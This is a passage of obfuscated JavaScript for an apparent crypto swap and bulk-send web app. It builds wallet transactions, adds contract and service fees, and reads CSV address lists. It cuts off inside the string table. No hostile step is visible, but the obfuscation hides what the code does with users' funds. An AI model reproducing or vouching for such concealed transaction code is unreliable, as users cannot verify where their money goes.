$(_0x598e1e(0x386))[_0x598e1e(0x383)](_0x598e1e(0x24f)), await _0x184df1[_0x598e1e(0x322)][_0x598e1e(0x3b6)](_0x107663)['call']({ 'from': web3[_0x598e1e(0x1e4)]['selectedAddress'] }, function (_0xe3a8ab, _0x1f94a7) { var _0x2e9045 = _0x598e1e; !_0xe3a8ab ? (console[_0x2e9045(0x3bb)](_0x2e9045(0x1e9), _0x1f94a7), myContract[_0x2e9045(0x322)]['TokenDecimals']()[_0x2e9045(0x3c5)](function (_0x4f08bd, _0x359ed0) { var _0x23c21f = _0x2e9045, _0x1f1334 = parseInt(_0x1f94a7), _0x4b6c4e = Math['pow'](0xa, parseInt(_0x359ed0)); MyTokenBalance = (_0x1f1334 / _0x4b6c4e)[_0x23c21f(0x2df)](0x2); var _0x1c7e8f = _0x23c21f(0x3a5); if (document[_0x23c21f(0x333)](_0x23c21f(0x2ff))[_0x23c21f(0x3c2)] == 0x38) _0x1c7e8f = 'https://bscscan.com/address/0x55d398326f99059ff775485246999027b3197955'; else { if (document[_0x23c21f(0x333)](_0x23c21f(0x2ff))[_0x23c21f(0x3c2)] == 0x89) _0x1c7e8f = _0x23c21f(0x286); else { if (document['getElementById'](_0x23c21f(0x2ff))[_0x23c21f(0x3c2)] == 0xfa) _0x1c7e8f = _0x23c21f(0x308); else document[_0x23c21f(0x333)](_0x23c21f(0x2ff))[_0x23c21f(0x3c2)] == 0xa86a && (_0x1c7e8f = _0x23c21f(0x2fe)); } } $(_0x23c21f(0x386))[_0x23c21f(0x383)](_0x23c21f(0x3a0) + _0x23c21f(0x33d) + _0x1c7e8f + '\x20target=\x27_blank\x27\x20>\x20USDT\x20</a>' + _0x23c21f(0x2d5) + MyTokenBalance + ''), console[_0x23c21f(0x3bb)](_0x23c21f(0x1fb), _0x359ed0), console[_0x23c21f(0x3bb)](_0x23c21f(0x30b), _0x1f1334); })) : console[_0x2e9045(0x3bb)]('balanceOf\x20can\x20not\x20connect\x20to\x20the\x20smart\x20contract'); }); } async function SwapNow() { var _0x1a5474 = _0x47d6b7; $(_0x1a5474(0x234))[_0x1a5474(0x383)](''); let _0x44d4cb = document[_0x1a5474(0x333)](_0x1a5474(0x20b))[_0x1a5474(0x332)]['replace']('⌄', ''), _0x147351 = document[_0x1a5474(0x333)]('ToButton')[_0x1a5474(0x332)][_0x1a5474(0x331)]('⌄', ''); document[_0x1a5474(0x333)](_0x1a5474(0x1ed))[_0x1a5474(0x2d9)][_0x1a5474(0x372)] = _0x1a5474(0x26c); if (LeftCoinBalance > document['getElementById'](_0x1a5474(0x1f2))[_0x1a5474(0x3c2)] && document[_0x1a5474(0x333)](_0x1a5474(0x2ff))[_0x1a5474(0x332)] != document[_0x1a5474(0x333)](_0x1a5474(0x20f))[_0x1a5474(0x332)]) { $(_0x1a5474(0x22d))['show'](), console[_0x1a5474(0x3bb)](_0x1a5474(0x261), document[_0x1a5474(0x333)](_0x1a5474(0x1f2))['value']), ISendobj = document['getElementById'](_0x1a5474(0x2ff)), IWantobj = document['getElementById'](_0x1a5474(0x20f)), console[_0x1a5474(0x3bb)](_0x1a5474(0x2da), USDIn), console['log'](_0x1a5474(0x27b), USDOut); let _0x47ed4a = 0x1, _0x91af5c = '0'; var _0x5a0b79 = await new web3[(_0x1a5474(0x245))][(_0x1a5474(0x235))](TokenSmartContractABI, USDIn, { 'from': web3[_0x1a5474(0x1e4)]['selectedAddress'] }), _0x441383 = await _0x5a0b79[_0x1a5474(0x322)][_0x1a5474(0x3b3)]()['call'](); console[_0x1a5474(0x3bb)](_0x1a5474(0x1fb), _0x441383); var _0x37499e = parseFloat(document[_0x1a5474(0x333)](_0x1a5474(0x1f2))[_0x1a5474(0x3c2)]), _0x4eacc0 = Math[_0x1a5474(0x35a)](0xa, parseInt(_0x441383)); let _0x4a7613 = BigInt(_0x37499e * _0x4eacc0)[_0x1a5474(0x21e)](); console[_0x1a5474(0x3bb)](_0x1a5474(0x35f), _0x4a7613); let _0x289365 = await myContract[_0x1a5474(0x322)]['findBestPath'](_0x4a7613, USDIn, USDOut, _0x47ed4a)[_0x1a5474(0x3c5)](); console[_0x1a5474(0x3bb)](_0x1a5474(0x36a), USDIn), console[_0x1a5474(0x3bb)]('SwapNow\x20web3.currentProvider.selectedAddress:', web3['currentProvider'][_0x1a5474(0x2bc)]), console[_0x1a5474(0x3bb)](_0x1a5474(0x2c8), _0x289365); if (_0x44d4cb == MainCoin) await SwapNoSplitFromMainCoin(_0x289365, _0x91af5c, _0x4a7613); else _0x147351 == MainCoin ? await SwapNoSplitToMainCoin(_0x289365, _0x91af5c) : await SwapNoSplit(_0x289365, _0x91af5c); } else $('#Tips')[_0x1a5474(0x383)]('Balance\x20not\x20enough\x20or\x20select\x20same\x20coin'), console[_0x1a5474(0x3bb)](_0x1a5474(0x315)); } async function SwapNoSplit(_0x1b48d9, _0x281e34) { var _0x1d31df = _0x47d6b7; console[_0x1d31df(0x3bb)]('call\x20SwapNoSplit'), await myContract[_0x1d31df(0x322)][_0x1d31df(0x30a)]([_0x1b48d9[_0x1d31df(0x1f8)][0x0], _0x1b48d9[_0x1d31df(0x1f8)][_0x1b48d9['amounts']['length'] - 0x1], _0x1b48d9[_0x1d31df(0x31e)], _0x1b48d9['adapters']], web3['currentProvider'][_0x1d31df(0x2bc)], _0x281e34)[_0x1d31df(0x3b7)]({ 'from': web3['currentProvider'][_0x1d31df(0x2bc)] }, function (_0x3092fd, _0x368c00) { var _0x44ec07 = _0x1d31df; !_0x3092fd ? (console[_0x44ec07(0x3bb)](_0x44ec07(0x23c), _0x368c00), $(_0x44ec07(0x22d))[_0x44ec07(0x2d7)]()) : (console[_0x44ec07(0x3bb)](_0x44ec07(0x2b0)), $(_0x44ec07(0x22d))['hide'](), _0x3092fd[_0x44ec07(0x1e3)][_0x44ec07(0x3b4)](_0x44ec07(0x2b1)) && console['log'](_0x44ec07(0x2b1))); })[_0x1d31df(0x37b)](_0x1d31df(0x28d), function (_0x5ed2dd) { var _0x6eb4ad = _0x1d31df; console[_0x6eb4ad(0x3bb)](_0x6eb4ad(0x382), _0x5ed2dd); })['once'](_0x1d31df(0x2f8), function (_0x3c5406) { var _0x1ca2b5 = _0x1d31df; console[_0x1ca2b5(0x3bb)]('receipt:', _0x3c5406); }); } async function SwapNoSplitFromMainCoin(_0x1c857d, _0xc0b91b, _0x417d19) { var _0xee1463 = _0x47d6b7; console[_0xee1463(0x3bb)]('call\x20SwapNoSplitFromMainCoin'), await myContract['methods'][_0xee1463(0x306)]([_0x1c857d[_0xee1463(0x1f8)][0x0], _0x1c857d[_0xee1463(0x1f8)][_0x1c857d['amounts'][_0xee1463(0x253)] - 0x1], _0x1c857d[_0xee1463(0x31e)], _0x1c857d['adapters']], web3['currentProvider'][_0xee1463(0x2bc)], _0xc0b91b)['send']({ 'from': web3[_0xee1463(0x1e4)]['selectedAddress'], 'value': _0x417d19 }, function (_0x1823cc, _0x384870) { var _0x48edfe = _0xee1463; !_0x1823cc ? (console[_0x48edfe(0x3bb)]('swapNoSplit\x20finish', _0x384870), $(_0x48edfe(0x22d))[_0x48edfe(0x2d7)]()) : (console[_0x48edfe(0x3bb)](_0x48edfe(0x2b0)), $(_0x48edfe(0x22d))[_0x48edfe(0x2d7)](), _0x1823cc[_0x48edfe(0x1e3)][_0x48edfe(0x3b4)](_0x48edfe(0x2b1)) && console[_0x48edfe(0x3bb)](_0x48edfe(0x2b1))); })[_0xee1463(0x37b)]('transactionHash', function (_0x4b6744) { var _0x296f6d = _0xee1463; console[_0x296f6d(0x3bb)]('hash:', _0x4b6744); var _0x1e254 = _0x4b6744, _0x5e88b8 = _0x4b6744[_0x296f6d(0x292)](0x0, 0x14) + '...'; $('#Tips')[_0x296f6d(0x383)](_0x296f6d(0x28f) + _0x296f6d(0x330) + UseScan + _0x296f6d(0x1f7) + _0x1e254 + '\x22\x20target=\x22_blank\x22\x20>' + _0x5e88b8 + '</a>'); })[_0xee1463(0x37b)](_0xee1463(0x2f8), function (_0x2b725a) { var _0xa1b09b = _0xee1463; console['log'](_0xa1b09b(0x2a9), _0x2b725a), $(_0xa1b09b(0x22d))[_0xa1b09b(0x2d7)](), document[_0xa1b09b(0x333)](_0xa1b09b(0x1ed))[_0xa1b09b(0x2d9)]['color'] = _0xa1b09b(0x2a8); }); } async function SwapNoSplitToMainCoin(_0xc98cb6, _0x44a081) { var _0x210c87 = _0x47d6b7; console[_0x210c87(0x3bb)]('findBestPathResult.amounts[0]:', _0xc98cb6[_0x210c87(0x1f8)][0x0]), console[_0x210c87(0x3bb)](_0x210c87(0x348)), await myContract[_0x210c87(0x322)][_0x210c87(0x2f0)]([_0xc98cb6['amounts'][0x0], _0xc98cb6[_0x210c87(0x1f8)][_0xc98cb6[_0x210c87(0x1f8)][_0x210c87(0x253)] - 0x1], _0xc98cb6[_0x210c87(0x31e)], _0xc98cb6[_0x210c87(0x2f9)]], web3['currentProvider'][_0x210c87(0x2bc)], _0x44a081)[_0x210c87(0x3b7)]({ 'from': web3[_0x210c87(0x1e4)][_0x210c87(0x2bc)] }, function (_0x658df6, _0x5b6f48) { var _0x4921e0 = _0x210c87; !_0x658df6 ? (console[_0x4921e0(0x3bb)](_0x4921e0(0x23c), _0x5b6f48), $(_0x4921e0(0x22d))[_0x4921e0(0x2d7)]()) : ($(_0x4921e0(0x22d))[_0x4921e0(0x2d7)](), console[_0x4921e0(0x3bb)](_0x4921e0(0x2b0)), _0x658df6[_0x4921e0(0x1e3)]['includes'](_0x4921e0(0x2b1)) && console['log'](_0x4921e0(0x2b1))); })[_0x210c87(0x37b)](_0x210c87(0x28d), function (_0x325e06) { var _0x4d1246 = _0x210c87; console[_0x4d1246(0x3bb)]('hash:', _0x325e06); })['once']('receipt', function (_0x220ebd) { console['log']('receipt:', _0x220ebd); }); } function SendEtherOrToken(_0xaf3c89) { var _0x29a5aa = _0x47d6b7; if (_0xaf3c89 == 'SendToken') console[_0x29a5aa(0x3bb)](_0x29a5aa(0x33b), _0xaf3c89), document[_0x29a5aa(0x333)]('SendTokenRadioID')[_0x29a5aa(0x3ba)] = !![], document[_0x29a5aa(0x333)](_0x29a5aa(0x375))['checked'] = ![], SendTokenBool = !![], SendFee = (BigInt(ContractFee) + BigInt(web3['utils'][_0x29a5aa(0x2f6)](BeeFee[_0x29a5aa(0x21e)]())))['toString'](), console[_0x29a5aa(0x3bb)](_0x29a5aa(0x3c1), SendFee), $(_0x29a5aa(0x34e))[_0x29a5aa(0x29e)](), $(_0x29a5aa(0x1e5))['hide'](), CurrentTokenDecimals = 0x0, $(_0x29a5aa(0x329))['html'](''), $(_0x29a5aa(0x234))[_0x29a5aa(0x383)](''); else _0xaf3c89 == 'SendEther' && (SendTokenBool = ![], SendFee = 0x0, console['log'](_0x29a5aa(0x33b), _0xaf3c89), document['getElementById'](_0x29a5aa(0x36d))[_0x29a5aa(0x3ba)] = ![], document['getElementById'](_0x29a5aa(0x375))['checked'] = !![], CurrentTokenDecimals = 0x12, $(_0x29a5aa(0x34e))[_0x29a5aa(0x2d7)](), $(_0x29a5aa(0x1e5))['show']()); } function SendType(_0x3d1039) { var _0x4a6e23 = _0x47d6b7; if (_0x3d1039 == _0x4a6e23(0x355)) console[_0x4a6e23(0x3bb)]('Choice:\x20', _0x3d1039), document[_0x4a6e23(0x333)](_0x4a6e23(0x346))['checked'] = !![], document[_0x4a6e23(0x333)]('SendDiffAmountRadio')[_0x4a6e23(0x3ba)] = ![], $('#SendSameAmountDiv')[_0x4a6e23(0x29e)](), $(_0x4a6e23(0x254))[_0x4a6e23(0x2d7)](), $('#dvCSV')[_0x4a6e23(0x383)](''), $('#Tips')[_0x4a6e23(0x383)](''); else _0x3d1039 == 'UploadCSV' && (console[_0x4a6e23(0x3bb)](_0x4a6e23(0x33b), _0x3d1039), document[_0x4a6e23(0x333)]('SendSameAmountRadio')[_0x4a6e23(0x3ba)] = ![], document[_0x4a6e23(0x333)](_0x4a6e23(0x2ef))[_0x4a6e23(0x3ba)] = !![], $('#SendSameAmountDiv')[_0x4a6e23(0x2d7)](), $(_0x4a6e23(0x254))[_0x4a6e23(0x29e)](), Upload()); } function checkRadio(_0x4c9dc3) { var _0x49a6c5 = _0x47d6b7; if (_0x4c9dc3 == _0x49a6c5(0x3a2)) console['log']('Choice:\x20', _0x4c9dc3), document['getElementById'](_0x49a6c5(0x259))[_0x49a6c5(0x3ba)] = !![], document[_0x49a6c5(0x333)](_0x49a6c5(0x1e8))[_0x49a6c5(0x3ba)] = ![], UseHighGasFee = !![], console[_0x49a6c5(0x3bb)](_0x49a6c5(0x227), UseHighGasFee); else _0x4c9dc3 == _0x49a6c5(0x211) && (console[_0x49a6c5(0x3bb)](_0x49a6c5(0x33b), _0x4c9dc3), document[_0x49a6c5(0x333)](_0x49a6c5(0x1e8))['checked'] = !![], document['getElementById'](_0x49a6c5(0x259))[_0x49a6c5(0x3ba)] = ![], UseHighGasFee = ![], console[_0x49a6c5(0x3bb)](_0x49a6c5(0x227), UseHighGasFee)); } function Upload() { var _0x9077b7 = _0x47d6b7, _0x1f7631 = document[_0x9077b7(0x333)](_0x9077b7(0x3c3)), _0x585041 = /^([a-zA-Z0-9\s_\\.\-:])+(.csv|.txt)$/; if (_0x585041[_0x9077b7(0x32e)](_0x1f7631[_0x9077b7(0x3c2)][_0x9077b7(0x3cc)]())) { if (typeof FileReader != _0x9077b7(0x2ba)) { var _0x5b3bca = new FileReader(); _0x5b3bca[_0x9077b7(0x22f)] = function (_0x551adf) { var _0x2c9edf = _0x9077b7, _0x97430f = document['createElement']('table'), _0x1bd5b1 = _0x551adf[_0x2c9edf(0x226)][_0x2c9edf(0x203)][_0x2c9edf(0x335)]('\x0a'); for (var _0x5f4380 = 0x0; _0x5f4380 < _0x1bd5b1['length']; _0x5f4380++) { var _0x1732ec = _0x97430f[_0x2c9edf(0x2a2)](-0x1), _0x14fed2 = _0x1bd5b1[_0x5f4380][_0x2c9edf(0x335)](','); for (var _0x18bf69 = 0x0; _0x18bf69 < _0x14fed2[_0x2c9edf(0x253)]; _0x18bf69++) { var _0x4c2bab = _0x1732ec[_0x2c9edf(0x24a)](-0x1); _0x4c2bab[_0x2c9edf(0x332)] = _0x14fed2[_0x18bf69]; } } var _0x105335 = document['getElementById']('dvCSV'); _0x105335['innerHTML'] = '', _0x105335[_0x2c9edf(0x201)](_0x97430f); }, _0x5b3bca[_0x9077b7(0x23a)](_0x1f7631[_0x9077b7(0x2a4)][0x0]); } else $('#Tips')[_0x9077b7(0x383)](_0x9077b7(0x268)), $(_0x9077b7(0x22d))['hide'](); } else $(_0x9077b7(0x234))[_0x9077b7(0x383)]('Please\x20choose\x20a\x20valid\x20CSV\x20file,\x20CSV\x20file\x20name\x20are\x20English\x20letters\x20only,like:\x20abc123.csv'), $(_0x9077b7(0x22d))[_0x9077b7(0x2d7)](); } function multiply(_0x4bb54f, _0x436c56) { var _0x3c0840 = _0x47d6b7; let _0x260d5f = 0x0, _0x251dc0 = 0x0; _0x4bb54f < 0x9 && (_0x4bb54f *= 0xa, _0x260d5f = 0x1); _0x436c56 < 0x9 && (_0x436c56 *= 0xa, _0x251dc0 = 0x1); let _0x27c9c8 = _0x4bb54f['length'], _0x51fc55 = _0x436c56[_0x3c0840(0x253)], _0x19dcf5 = [], _0x213bfc = []; console[_0x3c0840(0x3bb)](_0x4bb54f, _0x436c56); while (_0x4bb54f[_0x3c0840(0x253)] > 0x7) { _0x19dcf5['push'](_0x4bb54f[_0x3c0840(0x292)](_0x4bb54f[_0x3c0840(0x253)] - 0x7, _0x4bb54f[_0x3c0840(0x253)])), _0x4bb54f = _0x4bb54f['substring'](0x0, _0x4bb54f['length'] - 0x7); } _0x19dcf5[_0x3c0840(0x240)](_0x4bb54f); while (_0x436c56['length'] > 0x7) { _0x213bfc[_0x3c0840(0x240)](_0x436c56[_0x3c0840(0x292)](_0x436c56[_0x3c0840(0x253)] - 0x7, _0x436c56[_0x3c0840(0x253)])), _0x436c56 = _0x436c56[_0x3c0840(0x292)](0x0, _0x436c56[_0x3c0840(0x253)] - 0x7); } _0x213bfc[_0x3c0840(0x240)](_0x436c56), _0x19dcf5 = _0x19dcf5['reverse'](), _0x213bfc = _0x213bfc[_0x3c0840(0x3a4)](), console[_0x3c0840(0x3bb)](_0x19dcf5, _0x213bfc); let _0x56c4db = []; for (var _0x220252 = _0x19dcf5[_0x3c0840(0x253)] - 0x1, _0x5148c0 = 0x0; _0x220252 >= 0x0; _0x220252--, _0x5148c0++) { _0x56c4db[_0x5148c0] = _0x213bfc[_0x3c0840(0x248)](_0x1283b3 => _0x1283b3 * _0x19dcf5[_0x220252] === NaN ? '0000000' : _0x1283b3 * _0x19dcf5[_0x220252]); var _0x51310a = 0x0; while (_0x51310a < _0x5148c0) { _0x56c4db[_0x5148c0][_0x3c0840(0x240)](0x0), _0x51310a += 0x1; } } console['log'](_0x56c4db); var _0x385669 = _0x56c4db[_0x56c4db[_0x3c0840(0x253)] - 0x1]; for (var _0x5148c0 = 0x1; _0x5148c0 < _0x385669[_0x3c0840(0x253)]; _0x5148c0++) { for (var _0x220252 = 0x0; _0x220252 < _0x56c4db['length'] - 0x1; _0x220252++) { _0x56c4db[_0x220252]['length'] >= _0x5148c0 && (_0x385669[_0x385669[_0x3c0840(0x253)] - _0x5148c0] += _0x56c4db[_0x220252][_0x56c4db[_0x220252][_0x3c0840(0x253)] - _0x5148c0]); } } console['log'](_0x385669); let _0x2da74d = []; for (var _0x220252 = 0x0; _0x220252 < _0x385669[_0x3c0840(0x253)]; _0x220252++) { _0x2da74d['push'](''); } for (var _0x220252 = 0x1; _0x220252 <= _0x385669[_0x3c0840(0x253)]; _0x220252++)if (_0x220252 !== _0x385669['length']) _0x2da74d[_0x2da74d['length'] - _0x220252] = _0x385669[_0x385669['length'] - _0x220252]['toString']()[_0x3c0840(0x292)](_0x385669[_0x385669[_0x3c0840(0x253)] - _0x220252][_0x3c0840(0x21e)]()[_0x3c0840(0x253)] - 0x7, _0x385669[_0x385669[_0x3c0840(0x253)] - _0x220252][_0x3c0840(0x21e)]()[_0x3c0840(0x253)]), _0x385669[_0x385669[_0x3c0840(0x253)] - _0x220252 - 0x1] += parseInt(_0x385669[_0x385669[_0x3c0840(0x253)] - _0x220252][_0x3c0840(0x21e)]()[_0x3c0840(0x292)](0x0, _0x385669[_0x385669['length'] - _0x220252][_0x3c0840(0x21e)]()['length'] - 0x7)); else _0x2da74d[0x0] = _0x385669[0x0]; return console[_0x3c0840(0x3bb)](_0x2da74d), console[_0x3c0840(0x3bb)](_0x4bb54f, _0x436c56), _0x260d5f && (_0x2da74d[_0x2da74d[_0x3c0840(0x253)] - 0x1] /= 0xa), _0x251dc0 && (_0x2da74d[_0x2da74d[_0x3c0840(0x253)] - 0x1] /= 0xa), _0x2da74d['join'](''); } async function ReadCSVtoArray() { var _0xdfe630 = _0x47d6b7; let _0x5bcc78 = [], _0x2cf698 = []; var _0x59e47a = document[_0xdfe630(0x333)]('fileUpload'), _0x15fff9 = /^([a-zA-Z0-9\s_\\.\-:])+(.csv|.txt)$/; if (_0x15fff9[_0xdfe630(0x32e)](_0x59e47a['value'][_0xdfe630(0x3cc)]())) { if (typeof FileReader != _0xdfe630(0x2ba)) { var _0x3e7360 = new FileReader(); return _0x3e7360[_0xdfe630(0x22f)] = function (_0x14c164) { var _0x3acf85 = _0xdfe630, _0x12172a = document[_0x3acf85(0x20c)](_0x3acf85(0x20e)), _0xd13b7d = _0x14c164[_0x3acf85(0x226)][_0x3acf85(0x203)][_0x3acf85(0x335)]('\x0a'), _0x532b26 = 0x0; for (var _0x57a15d = 0x0; _0x57a15d < _0xd13b7d[_0x3acf85(0x253)]; _0x57a15d++) { var _0x59e7de = _0x12172a[_0x3acf85(0x2a2)](-0x1), _0x4d647b = _0xd13b7d[_0x57a15d][_0x3acf85(0x335)](','); if (_0x4d647b[0x0] != '' && _0x4d647b[0x1] != '') { _0x5bcc78[_0x3acf85(0x240)]($[_0x3acf85(0x2e8)](_0x4d647b[0x0])); var _0x269873 = BigNumber(parseInt(_0x4d647b[0x1] * Math[_0x3acf85(0x35a)](0xa, CurrentTokenDecimals[_0x3acf85(0x21e)]()))['toString']()), _0x439d7c = web3['utils'][_0x3acf85(0x359)](_0x269873); _0x532b26 = _0x532b26 + parseInt(web3[_0x3acf85(0x294)][_0x3acf85(0x2f6)](parseFloat(_0x4d647b[0x1])[_0x3acf85(0x21e)]())), console[_0x3acf85(0x3bb)]('amount:', parseFloat(_0x4d647b[0x1])), _0x2cf698['push'](_0x439d7c); } for (var _0x167470 = 0x0; _0x167470 < _0x4d647b[_0x3acf85(0x253)]; _0x167470++) { var _0x1fe375 = _0x59e7de[_0x3acf85(0x24a)](-0x1); _0x1fe375['innerHTML'] = _0x4d647b[_0x167470]; } } if (document[_0x3acf85(0x333)](_0x3acf85(0x375))[_0x3acf85(0x3ba)]) { console[_0x3acf85(0x3bb)](_0x3acf85(0x2e5)), CSVEtherTotal = _0x532b26, console[_0x3acf85(0x3bb)](_0x3acf85(0x267), CurrentTokenDecimals), console[_0x3acf85(0x3bb)](_0x3acf85(0x316), _0x532b26), console[_0x3acf85(0x3bb)](_0x3acf85(0x33f), CSVEtherTotal); var _0x279822 = BigNumber((CSVEtherTotal * Math[_0x3acf85(0x35a)](0xa, CurrentTokenDecimals['toString']()))[_0x3acf85(0x21e)]()), _0x264ec8 = web3[_0x3acf85(0x294)][_0x3acf85(0x2f6)](parseInt(_0x279822)[_0x3acf85(0x21e)]()); console[_0x3acf85(0x3bb)]('CSVEtherTotal', parseFloat(CSVEtherTotal)), console['log']('ContractFee', web3['utils'][_0x3acf85(0x224)](ContractFee)), console[_0x3acf85(0x3bb)]('BeeFee', parseFloat(BeeFee)), SendFee = BigInt(CSVEtherTotal) + BigInt(parseInt(ContractFee)) + BigInt(web3[_0x3acf85(0x294)][_0x3acf85(0x2f6)](BeeFee[_0x3acf85(0x21e)]())), console[_0x3acf85(0x3bb)]('parseFloat\x20SendFee:', SendFee), SendFee = SendFee['toString'](), console[_0x3acf85(0x3bb)](_0x3acf85(0x2e9), SendFee[_0x3acf85(0x21e)]()); } var _0x117cd9 = document['getElementById'](_0x3acf85(0x293)); _0x117cd9[_0x3acf85(0x332)] = '', _0x117cd9[_0x3acf85(0x201)](_0x12172a); }, _0x3e7360['readAsText'](_0x59e47a[_0xdfe630(0x2a4)][0x0]), { '_AddressArray': _0x5bcc78, '_AmountArray': _0x2cf698 }; } else $('#Tips')['html'](_0xdfe630(0x268)), $(_0xdfe630(0x22d))['hide'](); } else $(_0xdfe630(0x234))[_0xdfe630(0x383)](_0xdfe630(0x27e)), $(_0xdfe630(0x22d))[_0xdfe630(0x2d7)](); } $(_0x47d6b7(0x352))[_0x47d6b7(0x239)](function () { var _0x40ef0b = _0x47d6b7; $('#transactionHashLabel')[_0x40ef0b(0x383)](''), $(_0x40ef0b(0x234))[_0x40ef0b(0x383)](''), Upload(); }), $(_0x47d6b7(0x1e2))[_0x47d6b7(0x2f3)](function () { var _0x343567 = _0x47d6b7; $(_0x343567(0x22e))[_0x343567(0x34b)]('active'), $(this)[_0x343567(0x263)](_0x343567(0x388)); }, function () { var _0x2ad3d3 = _0x47d6b7; $(this)[_0x2ad3d3(0x34b)](_0x2ad3d3(0x388)), $(_0x2ad3d3(0x22e))[_0x2ad3d3(0x202)]()[_0x2ad3d3(0x263)]('active'); }); function _0x2034() { var _0x3151aa = ['receipt:', '_tokenContractAddress:', 'FromImage', '<th\x20scope=\x22row\x22>', 'https://bscscan.com/', 'AddressArea', 'https://bscscan.com/tx/', 'initiate\x20can\x20not\x20connect\x20to\x20the\x20smart\x20contract\x20', 'User\x20denied\x20transaction\x20signature', 'Non-Ethereum\x20browser\x20detected.\x20You\x20should\x20consider\x20trying\x20MetaMask!', 'Stock\x20is\x20not\x20enough', '#ContentDivID', '#SendBalance', 'USDIn\x20init', 'https://polygonscan.com', 'TempImage:', 'toast', 'undefined', 'getApproveStatus:', 'selectedAddress', '<span>Hours</span>', 'toChecksumAddress', 'document.getElementById(\x27MultISendInput\x27).value', 'SendToken:', 'current_price', 'price', 'toUpperCase', '#RecieveUSDDescription', '\x20target=\x22_blank\x22>', 'https://avascan.info/blockchain/c/', 'indexOf', 'findBestPathResult:', 'initiate\x20finish', 'join', '#CurrentAddress', '0xAbaBfd603054c405ca510dC8115d29059A20714A', 'This\x20is\x20the\x20Fantom\x20\x20network.', 'Bitcoin\x20Current\x20Price:\x20$', 'UpdateInfo..', 'Approval\x20hash:', '</td></tr>', 'Use\x20contract', '0x57c90b1C343624C224Bc6Edc4841A005E00f350b', '0x1a4fe656542003E910466958e5511A39b5EBCbE8', 'Balance:', 'RecieveAmount:', 'hide', 'USDFee', 'style', 'SelectISend:', 'Send\x20', 'IWantValue:', 'then', '#InitTips', 'toFixed', 'https://rpc-mainnet.maticvigil.com', 'CheckValue():', 'This\x20is\x20the\x20ropsten\x20test\x20network.', 'Stock:', 'DAI', 'Send\x20ETH\x20throgh\x20CSV.....', '<th>Initer\x20Want</th>\x20', 'Not\x20in\x20range,Exit', 'trim', 'ReadCSVtoArray\x20SendFee:', 'Binance\x20USDT\x20Stock\x20is\x20not\x20enough,Max:', 'append', '6001877ldjNYn', '</h>', '#AddressArea', 'SendDiffAmountRadio', 'swapNoSplitToMainCoin', '*Need\x20approve\x20token\x20first', 'ContractAddress', 'hover', 'This\x20is\x20the\x20ThunderCore\x20\x20network.', 'ISendChange...', 'toWei', 'Coins[nameID].Name:', 'receipt', 'adapters', 'balanceOf\x20can\x20not\x20connect\x20to\x20the\x20smart\x20contract', '<a\x20\x20name=\x22', 'img/icon/', 'test\x20error:', 'https://snowtrace.io/token/0xc7198437980c041c805a1edcba50c1ce5db95118', 'SelectISend', '2206908hVejBU', '#ToListContent', 'chainName', 'Please\x20choose\x20a\x20valid\x20CSV\x20file,\x20CSV\x20file\x20name\x20are\x20English\x20letters\x20only,like:\x20abc123.csv', 'multiSender\x20finish', 'ether', 'swapNoSplitFromMainCoin', '3QjEXBN', 'https://ftmscan.com/token/0x04068da6c83afcfa0e13ba15a6696662335d5b75', 'location', 'swapNoSplit', 'balance:', '#approveThisButton', 'error', 'This\x20is\x20mainnet', 'approveThis:invalid\x20ethereum\x20address', 'https://snowtrace.io/tx/', 'BNBPrice:', 'Token\x20Result:', 'Binance\x20Smart\x20Chain\x20Mainnet', 'USDOut\x20init', 'Swap:balance\x20not\x20enough\x20or\x20Same\x20coin\x20selected', 'ReadCSVtoArray\x20TotalAmount:', 'code', 'img/icon/default.png', '0xc5cB0c289801F0B1B74C4D433Ac5fD5610aB50A0', '#SelectIWant', 'selectedIndex', '\x20onerror=\x22this.src=\x20\x20\x27default.png\x27\x20\x20\x22\x20', 'Transaction\x20Hash:\x20', 'path', 'IWantChange\x20', 'init\x20order\x20contractAdress:', 'multiSender', 'methods', '<span>Seconds</span>', '#UserChooseCoinAddress', '<table\x20class=table>\x20\x20<tr>\x20\x20\x20', 'OriginAgs\x20:\x20', '#InitPageLoader', 'ETHPrice:', '#dvCSV', 'gasPrice:', 'allowance', 'USDT', 'MaticPrice:', 'test', 'ChooseToToken:', '<a\x20href=\x22', 'replace', 'innerHTML', 'getElementById', '\x27\x20target=\x27_blank\x27>\x20', 'split', 'queryAdapter', 'User\x20reject\x20switch\x20network.', 'textContent', 'SendMultiToken\x20SendFee:', 'User\x20reject\x20.', 'Choice:\x20', 'ShowAllOrders:', '<a\x20href=', '#loader2', 'ReadCSVtoArray\x20CSVEtherTotal:', '</td>\x20\x20', 'Switch\x20USDIn:', 'Please\x20choose\x20a\x20valid\x20CSV\x20file,csv\x20file\x20name\x20are\x20English\x20letters\x20only,like:\x20abc123.csv', 'ISendPrice:', '\x20</a>', 'Binance', 'SendSameAmountRadio', 'address/', 'call\x20SwapNoSplitToMainCoin', 'Current\x20Blochchain\x20Network\x20is\x20not\x20support,Switch\x20to\x20Binance,Polygon\x20or\x20other\x20Blockchain\x20please.', 'adaptersCount', 'removeClass', 'json', 'https://ropsten.etherscan.io/tx/', '#USDInfoDiv', 'ADAPTERS', 'SendMultiToken\x20CSVEtherTotal:', 'https://api.coingecko.com/api/v3/simple/price?ids=matic-network%2Cbnb%2Cethereum%2Cbinancecoin&vs_currencies=usd', '#fileUpload', 'net', ',you\x20have:', 'SameAmount', 'This\x20is\x20the\x20BSC\x20test\x20network.', 'ISendValue:', '.png', 'toBN', 'pow', '#SelectISend', '_AmountIniterWant:', 'AdapterResult:', 'TokenAddress', 'SwapNow\x20amountIn:', '#TradeNowButton', '#SendEtherTitleID', 'https://ftmscan.com/', 'https://etherscan.io/', 'FeeReciever:', 'binancecoin', 'accountsChanges', '_AmountArray', '_value', 'initOrder', 'USDIn:', 'start\x20read\x20csv...', 'Avalanche', 'SendTokenRadioID', 'getGasPrice', 'ethereum', 'Not\x20in\x20range,Exit....', 'This\x20is\x20fantom\x20mainnet', 'color', '</a>', 'suggest\x20price:', 'SendEtherRadioID', 'This\x20is\x20the\x20huobi\x20network.', '7711398xpARlP', 'I\x20Recieve\x20', 'This\x20is\x20the\x20Kovan\x20\x20network.', 'https://hecoinfo.com', 'once', '#toastButton', 'options', 'MainCoin\x20is\x20', 'This\x20is\x20Cronos\x20mainnet', '<tr><td>', 'approve', 'hash:', 'html', 'Can\x20not\x20read\x20This\x20token.', 'BTCPrice', '#balanceOf', '\x22\x20target=\x22_blank\x22\x20>', 'active', 'ReadCSVtoArrayOBJ:', 'USDC', '6dFubNS', '0x04068da6c83afcfa0e13ba15a6696662335d5b75', 'MultISendInput', 'current\x20id\x20\x20', 'BeeFee:', 'onclick', 